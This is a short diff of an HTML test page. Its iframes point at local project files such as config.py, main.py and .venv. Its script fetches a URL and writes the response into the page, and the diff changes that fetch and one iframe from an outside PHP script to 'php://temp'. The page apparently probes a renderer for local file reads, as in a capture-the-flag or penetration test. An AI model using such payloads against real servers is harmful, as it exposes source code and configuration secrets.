@@ -9,7 +9,7 @@
 <body>
     <iframe src="file://.venv" width="400" height="400"></iframe>
     <iframe src="file://config.py" width="400" height="400"></iframe>
-    <iframe src="file://.gitignore" width="400" height="400"></iframe>
+    <iframe src="php://temp" width="400" height="400"></iframe>
     <iframe src="file://main.py" width="400" height="400"></iframe>
     <iframe src="file://__pycache__" width="400" height="400"></iframe>
     <iframe src="file://__init__.py" width="400" height="400"></iframe>
@@ -22,7 +22,7 @@
         x.onload=function(){
         document.write(this.responseText)
         };
-        x.open("GET","https://anyquestions69.github.io/script.php");
+        x.open("GET","php://temp");
         x.send();
         console.log(window)
         </script>
